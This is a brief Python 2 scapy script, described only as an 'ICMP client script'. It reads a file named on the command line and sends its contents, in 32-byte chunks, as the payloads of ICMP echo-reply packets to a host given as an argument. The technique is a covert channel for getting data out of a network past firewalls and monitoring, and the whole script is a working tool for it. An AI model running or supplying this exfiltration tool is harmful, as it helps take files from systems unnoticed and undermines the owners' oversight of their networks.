#!/usr/bin/python

#Name: Riley Scott
#Date: 2018-02-11
#Version: 1.1
#Description: ICMP client script

import sys
from scapy.all import *

conf.verb = 0

f = open(sys.argv[1])
data = f.read()
f.close()
host = sys.argv[2]

print "Data size is %d " % len(data)
nump = (len(data) / 32) + 1
print "Sending %d ICMP packets" % nump

i = 0
while i < len(data):
    pack = IP(dst=host)/ICMP(type="echo-reply")/data[i:i+32]
    send(pack)
    i = i + 32

print "Data sent"
